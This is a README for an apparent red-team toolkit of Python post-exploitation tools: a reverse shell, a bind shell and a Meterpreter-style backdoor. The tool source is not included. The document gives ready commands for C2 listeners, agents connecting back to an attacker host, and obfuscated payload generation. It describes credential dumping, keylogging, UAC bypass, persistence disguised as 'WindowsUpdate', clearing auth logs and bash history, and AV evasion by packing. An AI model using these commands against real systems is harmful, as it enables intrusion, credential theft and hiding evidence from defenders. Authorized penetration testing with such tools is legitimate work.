# Shells & Backdoors Toolkit

Advanced Python-based shells and backdoors for post-exploitation operations. Part of the Red Team Web Security Testing Toolkit.


## 📋 Tools Overview

| # | Tool | Type | Protocol | Encryption | Stealth |
|---|------|------|----------|------------|---------|
| 23 | `reverse_shell.py` | Reverse Shell | TCP/HTTP/HTTPS | XOR | Base64+GZip |
| 24 | `bind_shell.py` | Bind Shell | TCP/SSL | XOR | Yes |
| 25 | `meterpreter.py` | Advanced Backdoor | TCP/HTTP/HTTPS | XOR | Beacon Jitter |

---

## 🚀 Installation

### Prerequisites

- **Python 3.8+** (3.10+ recommended)
- **pip** (latest version)
- **Root/Administrator privileges** (for ports < 1024 and certain operations)

### Quick Install

```bash
# Clone the toolkit repository
git clone https://github.com/your-repo/redteam-web-toolkit.git
cd redteam-web-toolkit

# Install core dependencies
pip install -r requirements-shells.txt
```

### Dependencies by Tool

#### Reverse Shell (`reverse_shell.py`)
```bash
# Minimal dependencies (built-in modules only)
# No additional packages required for basic TCP mode

# For HTTP/HTTPS modes:
pip install requests

# For SSL support:
pip install pyOpenSSL
```

#### Bind Shell (`bind_shell.py`)
```bash
# Core dependencies (mostly built-in)
pip install cryptography  # For SSL certificate generation

# For Windows features:
pip install pywin32

# For process management:
pip install psutil
```

#### Meterpreter Backdoor (`meterpreter.py`)
```bash
# Core dependencies
pip install requests
pip install cryptography
pip install pyOpenSSL

# For Windows features:
pip install pywin32
pip install wmi

# For screenshots:
pip install Pillow

# For extended functionality:
pip install psutil
pip install netifaces
```

### Complete Requirements File

Create `requirements-shells.txt`:

```txt
# Core Dependencies
requests>=2.28.0
cryptography>=39.0.0
pyOpenSSL>=23.0.0

# Windows Support
pywin32>=305; platform_system == "Windows"
wmi>=1.5.1; platform_system == "Windows"

# Extended Features
Pillow>=9.4.0
psutil>=5.9.0
netifaces>=0.11.0

# Utilities
colorama>=0.4.6
```

### Platform-Specific Setup

#### Linux (Ubuntu/Debian)
```bash
# Install system dependencies
sudo apt-get update
sudo apt-get install -y \
    python3 python3-pip python3-dev \
    build-essential libssl-dev libffi-dev \
    libjpeg-dev zlib1g-dev

# Install Python packages
pip install -r requirements-shells.txt
```

#### macOS
```bash
# Using Homebrew
brew install python3
brew install openssl

# Install Python packages
pip3 install -r requirements-shells.txt
```

#### Windows
```bash
# Install Python from python.org
# Run as Administrator for bind shell operations

# Install dependencies
pip install -r requirements-shells.txt

# Windows-specific dependencies
pip install pywin32 wmi
```

---

## 📖 Tool 23: Reverse Shell Generator

### Purpose
Advanced reverse shell generator with multiple transport protocols, encryption, obfuscation, and built-in C2 server for establishing outbound connections from compromised systems.

### Architecture

```
┌─────────────────┐         ┌──────────────────┐
│   Target Host   │────────>│   C2 Server      │
│  (Reverse Shell)│  TCP    │  (Listener)      │
│                 │  HTTP   │                  │
│  - Encrypted    │  HTTPS  │  - Session Mgmt  │
│  - Obfuscated   │         │  - Interactive   │
└─────────────────┘         └──────────────────┘
```

### Key Capabilities

#### Transport Protocols
- **TCP** - Direct socket connection with reconnection
- **HTTP** - Beaconing via HTTP requests (bypasses firewalls)
- **HTTPS** - Encrypted HTTP transport (bypasses IDS/IPS)

#### Security Features
- **XOR Encryption** - Traffic encryption with rotating key
- **Base64+GZip Obfuscation** - Command output obfuscation
- **Session Management** - Multiple concurrent sessions

#### Post-Exploitation
- **Command Execution** - Full shell command execution
- **File Operations** - Upload/download capabilities
- **Persistence** - Cron, systemd, registry, scheduled tasks
- **Screenshots** - Cross-platform screenshot capture
- **Process Migration** - Move to different process
- **System Info** - Comprehensive system enumeration

#### C2 Features
- **Interactive Console** - Command-line interface for operators
- **Session Switching** - Manage multiple sessions
- **Background Sessions** - Keep sessions alive while switching
- **Payload Generation** - Create standalone payload scripts

### Usage

#### Starting C2 Listener

```bash
# TCP Listener
python reverse_shell.py listener --host 0.0.0.0 --port 4444

# HTTP C2 with admin panel
python reverse_shell.py listener --host 0.0.0.0 --port 80 --type http

# HTTPS C2 with encryption
python reverse_shell.py listener --host 0.0.0.0 --port 443 --type https
```

#### Connecting Back (Target)

```bash
# Basic TCP connection
python reverse_shell.py connect --host 10.0.0.1 --port 4444

# With encryption
python reverse_shell.py connect --host 10.0.0.1 --port 4444 --encrypt

# With obfuscation
python reverse_shell.py connect --host 10.0.0.1 --port 4444 --encrypt --obfuscate

# HTTP beacon mode
python reverse_shell.py connect --host 10.0.0.1 --port 80 --type http
```

#### Generating Standalone Payload

```bash
# Generate obfuscated payload
python reverse_shell.py generate --host 10.0.0.1 --port 4444 \
    --type tcp --encrypt --obfuscate --output payload.py

# Generate HTTP beacon payload
python reverse_shell.py generate --host 10.0.0.1 --port 80 \
    --type http --output http_payload.py
```

### Expected Output

#### C2 Server
```
[*] TCP C2 Server listening on 0.0.0.0:4444
[*] Waiting for connections...

[+] New connection from 192.168.1.100:54321
[CONNECTED] {
  "hostname": "TARGET-PC",
  "os": "Windows",
  "platform": "win32",
  "user": "Administrator",
  "ip": "192.168.1.100",
  "pid": 1234
}

[192.168.1.100:54321]> sysinfo
[CONNECTED] {
  "hostname": "TARGET-PC",
  "os": "Windows",
  ...
}

[192.168.1.100:54321]> whoami
desktop-abc123\administrator

[192.168.1.100:54321]> sessions

[*] Active sessions:
    - 192.168.1.100:54321
    - 10.0.0.50:12345
```

#### Target Connection
```
[*] Starting TCP reverse shell
[*] Connecting to 10.0.0.1:4444
[*] Encryption enabled (XOR)
[*] Obfuscation enabled (Base64+GZip)
```

### Interactive Commands

| Command | Description |
|---------|-------------|
| `sysinfo` | Display system information |
| `shell <cmd>` | Execute system command |
| `sessions` | List active sessions |
| `background` | Background current session |
| `switch <id>` | Switch to another session |
| `persist` | Install persistence |
| `screenshot` | Take screenshot |
| `exit` | Close connection |

---

## 📖 Tool 24: Bind Shell

### Purpose
Advanced bind shell that listens on a target system for incoming connections, with authentication, encryption, stealth features, and comprehensive post-exploitation capabilities.

### Architecture

```
┌─────────────────┐         ┌──────────────────┐
│   Target Host   │<────────│   Attacker        │
│  (Bind Shell)   │  TCP    │  (Client)         │
│                 │  SSL    │                  │
│  - Listening     │         │  - Password Auth  │
│  - Encrypted    │         │  - Interactive    │
└─────────────────┘         └──────────────────┘
```

### Key Capabilities

#### Security Features
- **Password Authentication** - Challenge-response authentication
- **XOR Encryption** - All traffic encrypted
- **SSL/TLS Support** - Certificate-based encryption
- **IP Whitelisting** - Restrict connections to specific IPs

#### Stealth Features
- **Stealth Mode** - Hide process window (Windows), detach process (Linux)
- **Log Cleaning** - Clear system logs and bash history
- **Process Hiding** - Obfuscate process name

#### Post-Exploitation
- **Full Shell Access** - Interactive command execution
- **File Transfer** - Upload/download with progress
- **Interactive Shell** - Spawn interactive cmd/bash
- **Persistence** - Multiple persistence methods
- **Network Enumeration** - netstat, connections
- **Process Listing** - ps, tasklist

### Usage

#### Starting Bind Shell (Target)

```bash
# Basic bind shell
python bind_shell.py listen --port 4444

# With password authentication
python bind_shell.py listen --port 4444 --password "Str0ngP@ss!"

# With SSL encryption
python bind_shell.py listen --port 4444 --ssl --password "secret"

# Stealth mode
python bind_shell.py listen --port 4444 --stealth

# IP whitelist
python bind_shell.py listen --port 4444 --whitelist "10.0.0.1,192.168.1.100"

# Full featured
python bind_shell.py listen --port 4444 \
    --password "secure123" \
    --ssl \
    --stealth \
    --whitelist "10.0.0.1"
```

#### Connecting to Bind Shell (Attacker)

```bash
# Basic connection
python bind_shell.py connect --host 10.0.0.5 --port 4444

# With authentication
python bind_shell.py connect --host 10.0.0.5 --port 4444 --password "Str0ngP@ss!"

# SSL connection
python bind_shell.py connect --host 10.0.0.5 --port 4444 --ssl --password "secret"
```

### Expected Output

#### Bind Shell Listener
```
[*] SSL Bind Shell listening on port 4444
[*] Encryption: Enabled
[*] Authentication: Required
[*] Stealth mode: Enabled
[*] IP whitelist: 10.0.0.1

[*] Waiting for connections...

[+] Connection from 10.0.0.1:54321

╔══════════════════════════════════════════╗
║        Advanced Bind Shell v2.0          ║
║        Type 'help' for commands          ║
╚══════════════════════════════════════════╝

[/home/user]> whoami
john

[/home/user]> sysinfo
{
  "hostname": "server01",
  "os": "Linux",
  "os_version": "#102-Ubuntu SMP",
  "current_user": "john",
  "ip_address": "10.0.0.5",
  "disk_total": "50 GB",
  "memory_total": "8 GB"
}

[/home/user]> netstat
Active Internet connections
tcp    0    0 0.0.0.0:4444    0.0.0.0:*    LISTEN
tcp    0    0 10.0.0.5:22     10.0.0.1:54321 ESTABLISHED
```

#### Client Connection
```
[+] Connected to 10.0.0.5:4444
[AUTH] Password: ********
[+] Authentication successful
[+] Connected to bind shell
```

### Built-in Commands

| Command | Description |
|---------|-------------|
| `help` | Show available commands |
| `sysinfo` | Display system information |
| `netstat` | Show network connections |
| `ps` | List running processes |
| `persist` | Install persistence |
| `clean` | Clean logs and traces |
| `download <file>` | Download file from target |
| `upload <file>` | Upload file to target |
| `shell` | Spawn interactive shell |
| `exit` | Close connection |

### Persistence Methods

| Platform | Method | Description |
|----------|--------|-------------|
| Linux | systemd | Create system service |
| Linux | crontab | Add reboot cron job |
| Linux | rc.local | Add to startup script |
| Windows | Registry | Add to Run key |
| Windows | Scheduled Task | Create scheduled task |

---

## 📖 Tool 25: Meterpreter-Style Backdoor

### Purpose
Advanced post-exploitation agent inspired by Metasploit's Meterpreter, featuring modular plugin architecture, multiple transport protocols, beaconing with jitter, and comprehensive system interaction capabilities.

### Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    Meterpreter Agent                        │
├─────────────────────────────────────────────────────────────┤
│  Transport Layer                                            │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                 │
│  │   TCP    │  │   HTTP   │  │  HTTPS   │                 │
│  └──────────┘  └──────────┘  └──────────┘                 │
├─────────────────────────────────────────────────────────────┤
│  Core Engine                                                │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                 │
│  │  Crypto  │  │  Tasks   │  │  Jitter  │                 │
│  └──────────┘  └──────────┘  └──────────┘                 │
├─────────────────────────────────────────────────────────────┤
│  Plugin System                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │  Stdapi  │  │   Priv   │  │   Kiwi   │  │  Espia   │  │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘  │
│  ┌──────────┐                                              │
│  │ Incognito│                                              │
│  └──────────┘                                              │
└─────────────────────────────────────────────────────────────┘
```

### Key Capabilities

#### Transport & Communication
- **TCP Transport** - Direct persistent connection
- **HTTP/HTTPS Transport** - Firewall-friendly beaconing
- **Configurable Beacon** - Adjustable interval with jitter
- **Session Management** - Unique session IDs, reconnection

#### Plugin Architecture

**Stdapi Plugin**
- File system operations (list, read, write, delete)
- Process management (list, kill, create)
- Network enumeration (interfaces, connections)
- System information gathering

**Priv Plugin**
- Privilege escalation techniques
- UAC bypass methods
- Token manipulation

**Kiwi Plugin** (Mimikatz-style)
- Credential dumping
- Password hash extraction
- Kerberos ticket manipulation

**Espia Plugin**
- Screenshot capture
- Keylogging (simulated)
- Screen monitoring

**Incognito Plugin**
- Token enumeration
- Token impersonation
- Process token manipulation

#### System Enumeration
- Comprehensive system information (50+ data points)
- Hardware details (CPU, RAM, drives)
- Software inventory
- User account enumeration
- Network configuration
- Security product detection
- Integrity level detection (Windows)

#### Post-Exploitation
- Shell command execution
- File upload/download
- Persistence installation
- Log cleaning
- Process migration
- Screenshot capture

### Usage

#### Starting C2 Server

```bash
# TCP C2 Server
python meterpreter.py server --host 0.0.0.0 --port 4444

# HTTP C2 Server
python meterpreter.py server --host 0.0.0.0 --port 80

# Full featured server
python meterpreter.py server --host 0.0.0.0 --port 443
```

#### Deploying Agent

```bash
# TCP Agent
python meterpreter.py agent --host 10.0.0.1 --port 4444

# HTTP Agent with custom beacon
python meterpreter.py agent --host 10.0.0.1 --port 80 \
    --transport http --interval 10 --jitter 0.3

# HTTPS Agent
python meterpreter.py agent --host 10.0.0.1 --port 443 \
    --transport https --interval 5

# Stealth agent
python meterpreter.py agent --host 10.0.0.1 --port 4444 \
    --interval 30 --jitter 0.5
```

### Expected Output

#### C2 Server
```
[*] Meterpreter C2 listening on 0.0.0.0:4444
[*] Waiting for agents...

[+] New session: TARGET-PC_aBc123De
    Hostname: TARGET-PC
    OS: Windows
    User: Administrator

╔══════════════════════════════════════════════════════════════╗
║              Meterpreter C2 Console                          ║
╠══════════════════════════════════════════════════════════════╣
║ Commands:                                                    ║
║   sessions       - List active sessions                      ║
║   interact <id>  - Interact with session                     ║
║   exit           - Exit console                              ║
╚══════════════════════════════════════════════════════════════╝

msf> sessions

[*] Active Sessions:
    TARGET-PC_aBc123De: TARGET-PC @ Administrator

msf> interact TARGET-PC_aBc123De

[*] Interacting with TARGET-PC_aBc123De
[*] Type 'background' to return

[TARGET-PC_aBc123De]> sysinfo
{
  "hostname": "TARGET-PC",
  "os": "Windows",
  "os_release": "10",
  "os_version": "10.0.19041",
  "architecture": "AMD64",
  "processor": "Intel64 Family 6 Model 158",
  "username": "Administrator",
  "domain": "WORKGROUP",
  "internal_ip": "192.168.1.100",
  "is_admin": true,
  "integrity_level": "High",
  "privileges": [
    "SeBackupPrivilege",
    "SeRestorePrivilege",
    "SeDebugPrivilege"
  ],
  "drives": [
    "C:\\",
    "D:\\"
  ],
  "users": [
    "Administrator",
    "Guest",
    "DefaultAccount"
  ]
}

[TARGET-PC_aBc123De]> shell whoami
desktop-abc123\administrator

[TARGET-PC_aBc123De]> screenshot
{
  "status": "success",
  "format": "PNG",
  "data": "iVBORw0KGgoAAAANSUhEUgAA..."
}

[TARGET-PC_aBc123De]> persist
{
  "status": "success",
  "methods": [
    "registry",
    "schtask"
  ]
}
```

#### Agent Output
```
[*] Meterpreter Agent TARGET-PC_aBc123De
[*] Transport: TCP
[*] Target: 10.0.0.1:4444
[*] Beacon interval: 5s
[*] Jitter: 20%
```

### Plugin Commands

#### Stdapi Plugin
```bash
shell <command>     # Execute shell command
ls <path>          # List directory
download <file>    # Download file
upload <file>      # Upload file
sysinfo           # System information
```

#### Priv Plugin
```bash
getsystem         # Attempt SYSTEM privileges
bypassuac         # Attempt UAC bypass
```

#### Kiwi Plugin
```bash
creds_all         # Dump all credentials
creds_wdigest     # Dump WDigest
creds_lsa         # Dump LSA secrets
```

#### Espia Plugin
```bash
screenshot        # Take screenshot
keylog_start      # Start keylogger
```

#### Incognito Plugin
```bash
list_tokens       # List available tokens
impersonate_token # Impersonate token
```

### Beacon Configuration

| Parameter | Description | Default |
|-----------|-------------|---------|
| `--interval` | Beacon interval (seconds) | 5 |
| `--jitter` | Random jitter percentage | 0.2 (20%) |
| `--transport` | Communication protocol | tcp |

**Beacon Timing Formula:**
```
actual_interval = interval * (1 + random(-jitter, +jitter))
```

Example with interval=10, jitter=0.3:
- Minimum: 7 seconds
- Maximum: 13 seconds
- Average: 10 seconds

---

## 🔧 Advanced Configuration

### Encryption Configuration

All tools use XOR encryption with configurable keys:

```python
# Change encryption key (modify in script)
self.encryption_key = hashlib.sha256(b"your_custom_key_here").digest()
```

### Custom Ports and Protocols

```bash
# HTTP on common ports to bypass firewalls
python reverse_shell.py listener --host 0.0.0.0 --port 80 --type http
python reverse_shell.py listener --host 0.0.0.0 --port 443 --type https

# Non-standard ports
python bind_shell.py listen --port 8080 --ssl
```

### Persistence Examples

```bash
# Windows persistence via Reverse Shell
[192.168.1.100:54321]> persist
Persistence installed:
  [+] Registry Run key added
  [+] Scheduled task created

# Linux persistence via Bind Shell
[/home/user]> persist
Persistence methods:
  [+] Systemd service created
  [+] Cron job added
  [+] RC.local entry added
```

### Cleanup Operations

```bash
# Clean traces before disconnecting
[192.168.1.100:54321]> clean
Logs cleaned:
  [+] Bash history cleared
  [+] Cleared /var/log/auth.log
  [+] Cleared /var/log/syslog
```

---

## 🛡️ Detection & Evasion

### AV/EDR Evasion Techniques

1. **Code Obfuscation**
   ```bash
   python reverse_shell.py generate --host 10.0.0.1 --port 4444 \
       --encrypt --obfuscate --output payload.py
   ```

2. **Process Injection** (simulated)
   ```bash
   [session]> migrate 1234
   ```

3. **Traffic Obfuscation**
   - XOR encryption
   - Base64 encoding
   - HTTP disguised as normal traffic

4. **Beacon Jitter**
   ```bash
   python meterpreter.py agent --jitter 0.5  # 50% randomization
   ```

### Network Detection

| Protocol | Detection Method | Evasion |
|----------|-----------------|---------|
| TCP | Port scanning | Use common ports |
| HTTP | Deep packet inspection | HTTPS encryption |
| HTTPS | Certificate inspection | Valid-looking certs |

### Host Detection Indicators

| Indicator | Description | Mitigation |
|-----------|-------------|------------|
| Process name | python.exe | Rename process |
| Network connections | Unusual outbound | Use common ports |
| Registry keys | Persistence entries | Use WMI events |
| File artifacts | Script files | Delete after execution |

---

## 📊 Comparison Matrix

| Feature | Reverse Shell | Bind Shell | Meterpreter |
|---------|--------------|------------|-------------|
| **Connection** | Outbound | Inbound | Outbound |
| **Firewall Bypass** | ✅ Easy | ❌ Difficult | ✅ Easy |
| **NAT Bypass** | ✅ Yes | ❌ No | ✅ Yes |
| **Encryption** | XOR | XOR/SSL | XOR |
| **Authentication** | ❌ No | ✅ Password | ❌ No |
| **Persistence** | ✅ Yes | ✅ Yes | ✅ Yes |
| **File Transfer** | ❌ Basic | ✅ Advanced | ✅ Advanced |
| **Screenshots** | ✅ Yes | ❌ No | ✅ Yes |
| **Plugin System** | ❌ No | ❌ No | ✅ Yes |
| **Beacon Mode** | ❌ No | ❌ No | ✅ Yes |
| **Session Mgmt** | ✅ Yes | ❌ No | ✅ Yes |
| **Stealth Mode** | ✅ Obfuscation | ✅ Native | ✅ Jitter |
| **Complexity** | Medium | Medium | High |

---

## 🐛 Troubleshooting

### Common Issues

#### 1. Connection Refused
```bash
# Check if port is open
netstat -an | grep PORT

# Check firewall
sudo ufw status  # Linux
netsh advfirewall show currentprofile  # Windows

# Try different port
python reverse_shell.py listener --port 8080
```

#### 2. Permission Denied (Port < 1024)
```bash
# Run with sudo (Linux)
sudo python reverse_shell.py listener --port 80

# Use higher port
python reverse_shell.py listener --port 8080

# Add capability (Linux)
sudo setcap 'cap_net_bind_service=+ep' /usr/bin/python3
```

#### 3. SSL Certificate Errors
```bash
# Ignore certificate verification
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# Or generate proper certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

#### 4. Antivirus Detection
```bash
# Use obfuscation
python reverse_shell.py generate --host IP --port PORT --encrypt --obfuscate

# Compile to executable
pip install pyinstaller
pyinstaller --onefile --noconsole payload.py

# Use packers
upx --best payload.exe
```

#### 5. Connection Timeout
```bash
# Increase timeout (modify script)
sock.settimeout(60)  # Increase from 30 to 60

# Check network latency
ping TARGET_IP

# Use TCP keepalive
sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
```

#### 6. Encoding Errors
```bash
# Fix Unicode errors
output = stdout.decode('utf-8', errors='ignore')

# Force UTF-8
import sys
sys.stdout.reconfigure(encoding='utf-8')
```

---

## 📝 Operational Security (OPSEC)

### Pre-Engagement
- [ ] Obtain written authorization
- [ ] Define scope and rules of engagement
- [ ] Set up dedicated C2 infrastructure
- [ ] Use VPN/proxies for C2 server
- [ ] Configure logging and reporting

### During Engagement
- [ ] Use encrypted communications
- [ ] Implement beacon jitter
- [ ] Clean up after each session
- [ ] Monitor for blue team detection
- [ ] Maintain access without persistence initially

### Post-Engagement
- [ ] Remove all persistence mechanisms
- [ ] Clean logs and artifacts
- [ ] Remove all uploaded files
- [ ] Kill all agent processes
- [ ] Document all actions taken

### Persistence Cleanup

```bash
# Windows
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /f
schtasks /delete /tn "WindowsUpdate" /f

# Linux
crontab -r
systemctl disable system-service.service
rm /etc/systemd/system/system-service.service
sed -i '/python.*reverse_shell/d' /etc/rc.local
```

---

## 🚨 Legal Warning

### Criminal Penalties

**United States:**
- Computer Fraud and Abuse Act (18 U.S.C. § 1030)
- Penalties: Up to 20 years imprisonment

**United Kingdom:**
- Computer Misuse Act 1990
- Penalties: Up to life imprisonment

**European Union:**
- Directive 2013/40/EU
- Penalties: Vary by member state

### Authorized Use Only

These tools may ONLY be used:
1. On systems you personally own
2. On systems you have EXPLICIT WRITTEN permission to test
3. In isolated lab environments for education
4. Under a valid penetration testing contract

### Prohibited Uses
- Testing without authorization
- Attacking third-party systems
- Any illegal activity
- Malicious purposes

---

### Adding New Transports

```python
def dns_transport(self, host, domain):
    """DNS tunneling transport"""
    while self.running:
        # DNS exfiltration logic
        pass
```

---

## 📄 License

MIT License - See LICENSE file for details.

**RESTRICTED USE NOTICE:** This software is provided for authorized security testing only. Any unauthorized use is strictly prohibited and may violate applicable laws.

## 🙏 Acknowledgments

- Metasploit Project for Meterpreter inspiration
- Security researchers who developed these techniques
- The open-source security community

## 📚 Resources

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

